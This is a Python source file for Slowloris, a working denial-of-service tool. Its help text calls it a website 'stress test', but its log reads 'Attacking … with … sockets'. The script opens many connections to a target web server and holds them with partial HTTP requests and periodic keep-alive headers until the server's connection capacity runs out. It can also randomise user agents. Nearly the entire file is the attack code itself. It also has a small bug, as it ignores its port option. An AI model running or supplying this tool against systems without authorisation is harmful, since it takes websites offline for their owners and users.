import socket, random, time, sys, argparse, random

parser = argparse.ArgumentParser(description="Slowloris, low bandwidth stress test tool for websites")
parser.add_argument('host',  nargs="?", help="Host to preform stress test on")
parser.add_argument('-p', '--port', default=80, help="Port of webserver, usually 80", type=int)
parser.add_argument('-s', '--sockets', default=150, help="Number of sockets to use in the test", type=int)
parser.add_argument('-v', '--verbose', dest="verbose", action="store_true", help="Increases logging")
parser.add_argument('-ua', '--randuseragents', dest="randuseragent", action="store_true", help="Randomizes user-agents with each request")
parser.set_defaults(verbose=False)
parser.set_defaults(randuseragent=False)
args = parser.parse_args()

if len(sys.argv)==1:
    parser.print_help()
    sys.exit(1)

if not args.host:
    print("Host required!")
    parser.print_help()
    sys.exit(1)

if args.verbose == True:
    log_level = 2
else:
    log_level = 1

def log(text, level=1):
    if log_level >= level:
        print(text)

list_of_sockets = []
user_agents = [
    "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0","Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393"
]

def init_socket(ip):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)
    s.connect((ip,80))

    s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
    if args.randuseragent:
        s.send("User-Agent: {}\r\n".format(random.choice(user_agents)).encode("utf-8"))
    else:
        s.send("User-Agent: {}\r\n".format(user_agents[0]).encode("utf-8"))
    s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
    return s

def main():
    ip = args.host
    socket_count = args.sockets
    log("Attacking {} with {} sockets.".format(ip, socket_count))

    log("Creating sockets...")
    for _ in range(socket_count):
        try:
            log("Creating socket nr {}".format(_), level=2)
            s = init_socket(ip)
        except socket.error:
            break
        list_of_sockets.append(s)

    while True:
        log("Sending keep-alive headers... Socket count: {}".format(len(list_of_sockets)))
        for s in list(list_of_sockets):
            try:
                s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
            except socket.error:
                list_of_sockets.remove(s)

        for _ in range(socket_count - len(list_of_sockets)):
            log("Recreating socket...")
            try:
                s = init_socket(ip)
                if s:
                    list_of_sockets.append(s)
            except socket.error:
                break
        time.sleep(15)

if __name__ == "__main__":
    main()
